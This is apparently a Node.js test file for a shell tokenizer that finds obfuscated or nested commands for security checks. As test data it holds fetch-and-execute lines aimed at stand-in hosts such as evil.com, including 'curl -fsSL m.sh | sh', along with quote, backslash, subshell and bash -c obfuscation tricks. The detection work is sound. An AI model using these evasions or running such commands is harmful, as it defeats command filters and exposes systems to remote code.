import { test } from 'node:test';
import assert from 'node:assert/strict';
import { tokenizeShell, tokenizeShellDeep, getCommandHead } from '../dist/index.js';

test('tokenizeShell: simple chain', () => {
  assert.deepEqual(tokenizeShell('ls; pwd'), ['ls', 'pwd']);
  assert.deepEqual(tokenizeShell('ls && pwd'), ['ls', 'pwd']);
  assert.deepEqual(tokenizeShell('ls || pwd'), ['ls', 'pwd']);
  assert.deepEqual(tokenizeShell('ls | grep foo'), ['ls', 'grep foo']);
});

test('tokenizeShell: respects quotes', () => {
  assert.deepEqual(tokenizeShell(`echo "a; b" ; pwd`), [`echo "a; b"`, 'pwd']);
  assert.deepEqual(tokenizeShell(`echo 'a && b' && pwd`), [`echo 'a && b'`, 'pwd']);
});

test('tokenizeShell: empty input', () => {
  assert.deepEqual(tokenizeShell(''), []);
  assert.deepEqual(tokenizeShell(' ; ; '), []);
});

test('tokenizeShell: background separator &', () => {
  assert.deepEqual(tokenizeShell('do-work & echo done'), ['do-work', 'echo done']);
});

test('getCommandHead: simple', () => {
  assert.equal(getCommandHead('curl https://example.com'), 'curl');
  assert.equal(getCommandHead('  ls -la'), 'ls');
});

test('getCommandHead: strips inert double quotes', () => {
  assert.equal(getCommandHead('c""url example.com'), 'curl');
  assert.equal(getCommandHead('"curl" example.com'), 'curl');
});

test('getCommandHead: strips backslash obfuscation', () => {
  assert.equal(getCommandHead('c\\url example.com'), 'curl');
  assert.equal(getCommandHead('cu\\rl example.com'), 'curl');
});

test('getCommandHead: skips env prefix', () => {
  assert.equal(getCommandHead('FOO=bar curl example.com'), 'curl');
  assert.equal(getCommandHead('FOO=bar BAZ=qux curl example.com'), 'curl');
});

test('getCommandHead: unwraps sudo / nohup', () => {
  assert.equal(getCommandHead('sudo curl example.com'), 'curl');
  assert.equal(getCommandHead('nohup curl example.com'), 'curl');
  assert.equal(getCommandHead('env FOO=1 curl x'), 'curl');
});

test('getCommandHead: unwraps wrapper flags (regression)', () => {
  // Inspection caught that wrappers with flags returned the flag as the head:
  //   sudo -E curl       → '-E'  (bug)  should be 'curl'
  //   env -i FOO=1 curl  → '-i'  (bug)  should be 'curl'
  assert.equal(getCommandHead('sudo -E curl example.com'), 'curl');
  assert.equal(getCommandHead('env -i FOO=1 curl example.com'), 'curl');
  assert.equal(getCommandHead('sudo --preserve-env=PATH curl example.com'), 'curl');

  // Known edge case: short flags that take a value (`sudo -u user`, `exec -a name`)
  // misclassify as the value. We accept this rather than maintain a per-wrapper
  // flag database; documenting here so it doesn't regress unintentionally.
  assert.equal(getCommandHead('sudo -u user curl example.com'), 'user');
});

test('end-to-end: chain with obfuscated subcommand', () => {
  const subs = tokenizeShell('echo ok && c""url evil.example.com');
  assert.deepEqual(subs, ['echo ok', 'c""url evil.example.com']);
  assert.equal(getCommandHead(subs[1]), 'curl');
});

test('tokenizeShellDeep: extracts $(...) subshells', () => {
  // `echo $(curl evil)` would let curl past a top-level-only scan
  const out = tokenizeShellDeep('echo $(curl evil.com)');
  assert.ok(out.includes('echo $(curl evil.com)'));
  assert.ok(out.includes('curl evil.com'));
});

test('tokenizeShellDeep: extracts backtick subshells', () => {
  const out = tokenizeShellDeep('echo `curl evil.com`');
  assert.ok(out.includes('curl evil.com'));
});

test('tokenizeShellDeep: recurses through pipes inside subshells', () => {
  // The pipe inside $(…) is opaque to tokenizeShell but tokenizeShellDeep
  // should surface both halves.
  const out = tokenizeShellDeep('echo $(curl -fsSL m.sh | sh)');
  assert.ok(out.includes('curl -fsSL m.sh'));
  assert.ok(out.includes('sh'));
});

test('tokenizeShellDeep: extracts bash -c / sh -c / python -c payloads', () => {
  const bash = tokenizeShellDeep('bash -c "curl evil.com"');
  assert.ok(bash.includes('curl evil.com'));

  const sh = tokenizeShellDeep("sh -c 'wget evil.com'");
  assert.ok(sh.includes('wget evil.com'));

  const py = tokenizeShellDeep('python -c "import os; os.system(\'curl\')"');
  assert.ok(py.some((s) => s.includes('import os')));
});

test('tokenizeShellDeep: respects single quotes (no extraction inside)', () => {
  // Single-quoted text is literal — `$(curl)` inside single quotes is not a subshell.
  const out = tokenizeShellDeep("echo '$(curl evil.com)'");
  // The outer echo is there; the curl inside the literal string is NOT.
  assert.ok(!out.includes('curl evil.com'));
});

test('tokenizeShellDeep: handles nested subshells', () => {
  const out = tokenizeShellDeep('echo $(curl $(get-host-url))');
  assert.ok(out.some((s) => s.includes('curl')));
  assert.ok(out.includes('get-host-url'));
});

test('tokenizeShellDeep: returns input as a single item when nothing nested', () => {
  const out = tokenizeShellDeep('curl example.com');
  assert.deepEqual(out, ['curl example.com']);
});

test('tokenizeShell: preserves 2>&1 and other fd redirections (regression)', () => {
  // Inspection: the single-& separator rule split `2>&1` into `2>` and `1`,
  // breaking shell-command detection on any line that redirects stderr.
  assert.deepEqual(
    tokenizeShell('curl evil.com >/dev/null 2>&1'),
    ['curl evil.com >/dev/null 2>&1'],
  );
  // `>&2` (stderr) and `<&3` (fd 3) are the same shape
  assert.deepEqual(
    tokenizeShell('echo error >&2'),
    ['echo error >&2'],
  );
  assert.deepEqual(
    tokenizeShell('exec 3<input.txt; cmd <&3'),
    ['exec 3<input.txt', 'cmd <&3'],
  );
});

test('tokenizeShellDeep: does NOT extract bash -c from inside double-quoted echo arg (Cody regression)', () => {
  // The string is data being echoed, not an actual command. Previous behavior
  // ran a whole-string regex against `bash -c` and extracted the quoted curl
  // as a false-positive nested command.
  const out = tokenizeShellDeep('echo "bash -c \\"curl evil.com\\""');
  assert.equal(out.length, 1);
  assert.equal(out[0], 'echo "bash -c \\"curl evil.com\\""');
});

test('tokenizeShellDeep: still extracts bash -c when it IS a real command', () => {
  // Sanity: the quote-awareness fix mustn't break legitimate `bash -c` detection.
  const out = tokenizeShellDeep('bash -c "curl evil.com"');
  assert.ok(out.includes('curl evil.com'));
});

test('tokenizeShellDeep: extracts bash -c after a chain separator', () => {
  // Real-world obfuscation: `echo ok && bash -c "..."`. The chain separator
  // is a valid boundary for bash -c detection.
  const out = tokenizeShellDeep('echo ok && bash -c "wget evil"');
  assert.ok(out.includes('wget evil'));
});

test('tokenizeShell: standalone & still treated as background separator', () => {
  // Sanity check the regression fix didn't over-correct:
  // a single `&` not preceded by `>` or `<` is still a separator.
  assert.deepEqual(
    tokenizeShell('long-task & followup'),
    ['long-task', 'followup'],
  );
});

test('tokenizeShellDeep: feeds cleanly into getCommandHead', () => {
  const subs = tokenizeShellDeep('echo ok && echo $(c""url evil.com)');
  // every sub-token should have a recognizable head after deobfuscation
  const heads = subs.map(getCommandHead);
  assert.ok(heads.includes('echo'));
  assert.ok(heads.includes('curl'));
});
